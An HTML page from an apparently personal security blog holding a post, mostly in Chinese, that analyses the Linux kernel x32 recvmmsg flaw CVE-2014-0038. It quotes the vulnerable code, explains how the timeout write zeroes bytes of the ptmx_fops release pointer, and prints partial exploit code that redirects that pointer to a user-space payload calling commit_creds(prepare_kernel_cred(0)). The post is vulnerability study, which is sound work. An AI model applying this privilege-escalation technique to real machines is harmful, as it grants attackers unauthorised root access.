<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title> CVE-2014-0038 &middot; fz84 </title>

  
  <link rel="stylesheet" href="http://bl4ck5un.github.io//css/poole.css">
  <link rel="stylesheet" href="http://bl4ck5un.github.io//css/syntax.css">
  <link rel="stylesheet" href="http://bl4ck5un.github.io//css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

    
  <link href="/css/github.css" rel="stylesheet" type="text/css">
<script src="/js/rainbow-custom.min.js"></script>

  
  <link rel="stylesheet" href="http://bl4ck5un.github.io//font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/favicon.ico">

  
  <link href="" rel="alternate" type="application/rss+xml" title="fz84" />
</head>

<body>

<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>fz84</h1>
      <p class="lead">
       Read, write and do research in systems and security 
      </p>
    </div>

    <ul class="sidebar-nav">
      <li><a href="/">Home</a> </li>
      
        <li><a href="/post/"> Blogs </a></li>
      
    </ul>

    <p>&copy; 2015. All rights reserved. </p>
  </div>
</div>


    <div class="content container">
<div class="post">
  <h1>CVE-2014-0038</h1>
  <span class="post-date">Wed, Apr 16, 2014</span>
      

<p>利用漏洞将 <code>ptmx_fops</code> 返回函数的高字节置零，让它指向payload。然后payload在被kernel执行，调用 <code>commit_cred</code> 获取root。</p>

<h1 id="vulnerability:782111c6003f4e7a42ea865448ddb72c">Vulnerability</h1>

<pre><code class="language-c">asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout)
{
  int datagrams;
  struct timespec ktspec;
  
  if (flags &amp; MSG_CMSG_COMPAT)
    return -EINVAL;
  
  if (COMPAT_USE_64BIT_TIME)
    return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
      flags | MSG_CMSG_COMPAT,
      (struct timespec *) timeout);
  ...
</code></pre>

<p><code>timeout</code> 是从userland传过来的指针，随后被直接（只做了cast <code>(struct timespec *) timeout</code> ）传给系统调用 <code>__sys_recvmmsg</code> 。</p>

<ul>
<li>Why <code>CONFIG_X86_X32</code> is mandatory?</li>
</ul>

<pre><code class="language-c">struct timespec {
  __kernel_time_t tv_sec;     /* seconds */
  long    tv_nsec;    /* nanoseconds */
};
typedef __kernel_long_t __kernel_time_t;
</code></pre>

<p><code>__sys_recvmmsg</code> 中有两处修改了 <code>void *timeout</code> .</p>

<ul>
<li>读取 <code>timeout</code></li>
</ul>

<pre><code class="language-c">if (timeout &amp;&amp; 
        poll_select_set_timeout(&amp;end_time, timeout-&gt;tv_sec,
          timeout-&gt;tv_nsec))  // READ ONLY, end_time = timeout
  return -EINVAL;
</code></pre>

<ul>
<li>更新 <code>timeout</code></li>
</ul>

<pre><code class="language-c">if (timeout) {
  ktime_get_ts(timeout);                         // get now
  *timeout = timespec_sub(end_time, *timeout);   // A - B
  if (timeout-&gt;tv_sec &lt; 0) {                     // if timeout really happens
    timeout-&gt;tv_sec = timeout-&gt;tv_nsec = 0;
    break;                                     // return
  }

  /* Timeout, return less than vlen datagrams */
  if (timeout-&gt;tv_nsec == 0 &amp;&amp; timeout-&gt;tv_sec == 0)
    break;
}
</code></pre>

<p>所以返回前将 <code>timeout-&gt;tv_sec = timeout-&gt;tv_nsec = 0;</code></p>

<h2 id="清除一个字节的过程:782111c6003f4e7a42ea865448ddb72c">清除一个字节的过程</h2>

<ol>
<li>主进程 <code>retval = syscall(__NR_recvmmsg, sockfd, &amp;msgs, 1, 0, (void*)addr)</code>; 其中 <code>addr &amp; 0xFF == 0xFF</code></li>
<li>子进程 <code>sleep(254)</code> 然后 sendto</li>
<li>因为父进程调用 <code>recv</code> 长达254s之后子进程才发送，所以父进程的调用 <code>__NR_recvmmsg</code> 会超时</li>
<li>超时发生时，<code>addr</code> 被写 <code>0</code>，然后返回。</li>
</ol>

<h1 id="获取root:782111c6003f4e7a42ea865448ddb72c">获取root</h1>

<ul>
<li>利用了 <code>ptmx_fops</code> 的release function指针（在non initialized (and thus writable) kernel memory中）</li>
<li>将指针的高3字节置0，使之指向用户空间中的payload</li>
<li>Open <code>/dev/ptmx</code>, close it and enjoy.</li>
</ul>

<h2 id="payload构造:782111c6003f4e7a42ea865448ddb72c">payload构造</h2>

<pre><code class="language-c">// code 是payload地址
code = (long)mmap((void*)(TTY_RELEASE &amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
// 0x90 技法
memset((void*)code, 0x90, PAYLOADSIZE);
code += PAYLOADSIZE - 1024;
memcpy((void*)code, &amp;kernel_payload, 1024);

// payload 构造
#define COMMIT_CREDS        0xffffffff8108ad40LL
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

    /* restore function pointer and following two longs */
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;

    /* escalate to root */
    commit_creds(prepare_kernel_cred(0));

    return -1;
}
</code></pre>

<h1 id="疑问:782111c6003f4e7a42ea865448ddb72c">疑问</h1>

<ol>
<li>为什么 <code>zero_out</code> 只置零1个字节，而不是一个 <code>long</code> (16 bytes)？</li>
</ol>

</div>
</div>

  </body>
</html>
